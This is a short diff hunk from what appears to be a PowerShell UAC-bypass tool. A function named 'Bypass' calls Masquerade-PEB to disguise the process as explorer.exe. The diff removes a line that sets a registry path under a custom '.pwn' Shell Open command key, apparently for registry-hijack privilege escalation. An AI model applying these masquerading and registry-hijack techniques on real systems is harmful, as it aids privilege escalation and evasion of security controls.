@@ -270,8 +270,7 @@ function Bypass {
         # Masquerade the PEB to make the process appear as explorer.exe
         Masquerade-PEB
 
-        # Create registry keys and set values
-        $regPath1 = "HKCU:\Software\Classes\.pwn\Shell\Open\command"
+
 
 
         # Supprime les clés existantes avant de créer de nouvelles pour éviter les conflits.
